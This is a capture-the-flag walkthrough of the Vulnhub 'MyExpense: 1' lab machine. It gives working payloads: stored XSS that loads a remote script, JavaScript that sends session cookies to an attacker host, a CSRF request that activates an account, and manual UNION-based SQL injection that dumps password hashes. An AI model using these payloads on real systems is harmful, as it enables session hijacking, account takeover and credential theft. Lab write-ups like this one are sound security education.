**Vulnhub > MyExpense: 1 Writeup**

Skills:

- Web Enumeration
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- XSS Cookie Hijacking
- XSS + CSRF in order to activate new registered users
- XSS vulnerability in message management system
- SQL Injection (Union Query Based)
- Cracking Hashes

The Walkthrough/Writeup

The idea is to try to hack the web panel by playing with XSS to try to get the money and have it sent to our account.

As usual, let's start with the reconnaissance phase. We'll begin by scanning the victim's ports using NMAP:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.100
```

Now that we have information about the ports, we'll launch a series of basic reconnaissance scripts using NMAP to gather information about the services and versions running on the open ports:

```
nmap -sCV -p80,34219,43215,47157,48083 192.168.0.100
```

We'll also perform fuzzing using Gobuster to discover directories and files on the website:

```
gobuster dir -u http://192.168.0.100/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

We've discovered a directory named admin, but when we try to access it on the website, we get a 403 FORBIDDEN error, indicating that we don't have permission to access that directory. So, we'll try to apply brute force to the admin directory using Gobuster again to discover directories beneath the admin directory and use -x php to search for files with the .php extension in that URL's directory:

```
gobuster dir -u http://192.168.0.100/admin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 20
```

Gobuster has discovered an admin.php file, so let's review it and see what it contains.

We see users with their roles, and we notice that the user Samuel is disabled. Remember that in this scenario, we are playing as Samuel Lamotte (you can see in the description of the vulnhub page what it's all about), and we have login credentials for the website, but since we are inactive in the system, we need to find another way to gain access to the machine. Let's create a new account since the system allows it, and see what we can achieve from the inside.

The system has a form to create an account, but the "sign up" button is disabled. If we check the HTML code, we can see that there is a "disabled" attribute. To enable the button, we can simply remove the "disabled" attribute.

If we go back to the [http://192.168.0.100/admin/admin.php](http://192.168.0.100/admin/admin.php) address, where users and their roles are managed, we can see that our account has been created, but it is inactive.

So will try to create another account, but this time we will play with XSS. We fill out all the form fields, but in the Firstname and Lastname fields, we will use the following javascript tag:

```
<script>alert("XSS")</script>
```

To check if the alert is executed, we go back to [http://192.168.0.100/admin/admin.php](http://192.168.0

.100/admin/admin.php).

And indeed, the alert is executed. This confirms that this part of the system is vulnerable to XSS. Now we can try to validate if there is any authenticated user who regularly visits the [http://192.168.0.100/admin/admin.php](http://192.168.0.100/admin/admin.php) address, and use XSS to steal their session cookie and authenticate ourselves as that user.

Let's do the following test: We set up an HTTP server on port 80 using Python to see if we receive any requests from the victim server:

```
python3 -m http.server 80
```

We create another user, but this time in the Firstname field, we put the following:

```
<script src="http://attackerip/pwned.js"></script>
```

We will try to load a file called "pwned.js" that does not exist yet, as we want to confirm if there is a request and once we confirm this request, we will create the script.

Now that we have created the user, let's check the terminal if we receive any requests.


We can see, we have received a request, and there is likely a user constantly checking the new users who register in the system.

Now we can give life to the "pwned.js" file to make that user give us their session cookie without them noticing. Let's try the following script:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://attackerip/?cookie=' + document.cookie); 
request.send();
```

Now that we have created our script, let's set up the server again with Python and wait for a response.

It worked, we got a response and now we have the cookie. Let's check on the web to which user this cookie belongs. So, let's go back to [http://192.168.0.100/admin/admin.php](http://192.168.0.100/admin/admin.php), press Ctrl+Shift+C and in "Storage" replace the values of "value" with the cookie we obtained, and reload the page.

We see the message "Sorry, as an administrator, you can be authenticated only once a time." So, the cookie belongs to the Administrator, but we cannot have two sessions open simultaneously. Let's remember once again that what we want to achieve is to authenticate as Samuel Lamotte, whose user is inactive.

If we click on the "inactive" button in [http://192.168.0.100/admin/admin.php](http://192.168.0.100/admin/admin.php) to try to activate it, it takes us to another URL where we get the message that we are not authorized to do this.

Apparently, through a GET request, the Administrator user or the user with the corresponding permissions can activate the account only by using that URL. Here, a CSRF vulnerability can occur, so if we manage to get the Administrator user to access that URL, it would automatically activate our account.

What we can do is edit our pwned.js script and change the part where we request the cookie, as we cannot reuse it, and put the URL there, like this:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.100/admin/admin.php?id=11&status=active');
request.send();
```

This way, the Administrator user makes a request without realizing it to the URL, and it automatically activates our account. Now, what we have to do is set up our server with Python again and wait for the request to be made.

Our script worked, and we see that our account is active (Samuel Lamotte). Now, we log in with our slamotte user and can submit the report to get paid 750 euros. But it's not that easy because now we need them to accept our report.

We can see that there is a chat on our panel, and if we analyze the users in this chat, we can determine their roles in [http://192.168.0.100/admin/admin.php](http://192.168.0.100/admin/admin.php). Therefore, we can try to steal the cookie from one of these users, just like we did previously with our script.

```javascript
var request = new XMLHttpRequest(); 
request.open('GET', 'http://attackip/?cookie=' + document.cookie); 
request.send();
```

Next, we will send a message in that chat with the following (assuming that the chat also has an XSS vulnerability):

```html
<script src="http://attackip/pwned.js"></script>
```

Now, we wait for a response on our end.

We see several responses, and it seems that there are three users and we have their session cookies. One of these

 must be the administrator that we previously stole from, so let's try to log in with one of the other cookies since we were unable to do so with the administrator's account. We will repeat the cookie replacement process:

We press the Ctrl+Shift+C keys and replace the "value" values in "Storage" with the cookie that we obtained, and then we reload the page.

Now, we are logged in as the user Manon Riviera, and we have a new option in this user's panel, which is our report waiting to be validated. Since we are logged in as this user, we will validate the report.

And now we need to log in with the user who accepts the reports once they are validated. The cookies we previously stole do not correspond to the user who is in charge of accepting these reports, so we need to find another way to achieve our goal.

Analyzing the URL in the "Rennes" panel, we see that it is vulnerable to SQL injection. We could use automated tools to exploit this SQL injection vulnerability, but I prefer to do it manually, so let's follow these steps:

We have the URL "http://192.168.0.100/site.php?id=2"

- We add `order by 2-- -` to apply a data sorting and thus determine the number of columns. If you put `order by 3-- -` you will see an error indicating that column number 3 does not exist. Therefore, we assume that there are only 2 columns in this database.
- Now that we know the total number of columns, we use `union select 1,2-- -`
- When we use `union select 1,2-- -`, we encounter an error. However, upon closer inspection, we notice that there are two numbers (in this case 1 and (2)) included in the query. The number enclosed in parentheses serves as the entry point for us.
- Now that we have an entry point, let's look for the databases: `union select 1,schema_name from information_schema.schemata-- -`
- We have the "myexpense" database, so let's get its tables: `union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -`
- We have a "user" table, let's look at its columns: `union select 1,column_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -`
- We have the "username" and "password" fields, so to view them, we do: `union select 1,group_concat(username,0x3a,password) from user-- -`

The passwords and usernames are disordered. However, if you want to view them in a more organized manner, you can use NVIM. Simply open a file, paste the output you received, and then execute the command `%s/,/\r/g`. This will improve the readability of the information by separating each value onto a new line. The command `%s/,/\r/g` is a substitution command used to replace all commas (',') in the file with a new line character ('\r') to split the values into separate lines.

So, we have obtained the usernames and passwords, so we will use the credentials of the user "pbaudouin" and his hash, which we can try to crack. So, we will use the hashes.com page to crack this hash.

Once we have obtained this data, we will log in with this information and accept the report so that the payment will be sent to us. Remember, we are playing as the user Samuel Lamotte and we did all of this to receive this payment.

Now, we will log in once

 again as the user "slamotte" and see the flag that confirms that we have successfully completed this VulnHub machine.
